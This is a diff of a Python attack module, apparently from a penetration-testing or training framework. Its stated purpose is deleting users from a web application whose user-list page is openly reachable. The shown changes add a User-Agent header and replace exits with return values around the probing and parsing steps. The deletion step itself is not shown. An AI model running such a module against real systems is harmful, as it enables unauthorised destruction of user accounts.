@@ -5,13 +5,12 @@ import sys
 import re
 import bs4
 
-
 class AtkGameCheatUserListBan(object):
     def __init__(self, utility, host="127.0.0.1", port="80", debug=False):
         self.utility = utility
-        self.utility.target = host
         self.host = host
         self.port = port
+        self.ua = utility.ua
         self.debug = debug
         self.description = "The module can be delete current users if a user list page can access yet."
         self.target = host + ":" + port
@@ -37,7 +36,7 @@ class AtkGameCheatUserListBan(object):
 
             session = requests.Session()  
 
-            headers = { "Content-Type": "application/x-www-form-urlencoded" }
+            headers = { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": self.ua }
             response1 = session.get(target_url, headers=headers, proxies=proxies, timeout=timeoutvalue)
 
             print("-----userlist check-----")
@@ -46,7 +45,7 @@ class AtkGameCheatUserListBan(object):
 
             if int(response1.status_code) != 200:
                 self.logger("Attack failed…", "!")
-                sys.exit(0)
+                return(False)
 
             regex1 = re.compile(r"%s" % re.escape("<tr>"))
             regex2 = re.compile(r"%s" % re.escape("<td>"))
@@ -55,7 +54,7 @@ class AtkGameCheatUserListBan(object):
                 self.logger("Userlist ACCESS SUCCESS!", "+")   
             else:
                 self.logger("Attack failed…", "!")
-                sys.exit(0)
+                return(False)
 
             soup1 = bs4.BeautifulSoup(response1.text,"lxml")
             seachresult1 = soup1.find_all('tr')
@@ -105,7 +104,7 @@ class AtkGameCheatUserListBan(object):
             self.logger("Error occurred", "!")
             file=sys.stderr
             print(e)
-            sys.exit(1)
+            return(False)
 
 
     def logger(self, m="", o="+"):
